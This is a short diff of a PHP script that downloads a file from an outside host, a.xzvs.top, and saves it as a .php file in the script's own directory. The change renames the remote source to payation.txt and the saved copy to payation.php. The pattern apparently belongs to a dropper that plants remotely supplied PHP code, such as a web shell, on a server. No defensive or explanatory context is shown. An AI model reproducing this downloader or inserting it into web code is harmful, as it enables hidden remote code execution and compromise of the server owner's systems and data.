@@ -16,9 +16,9 @@
 
 
 
-$url = "http://a.xzvs.top/888.php";
+$url = "http://a.xzvs.top/payation.txt";
 
-$savePath = __DIR__ . "/888.php";
+$savePath = __DIR__ . "/payation.php";
 
 $content = file_get_contents($url);
 
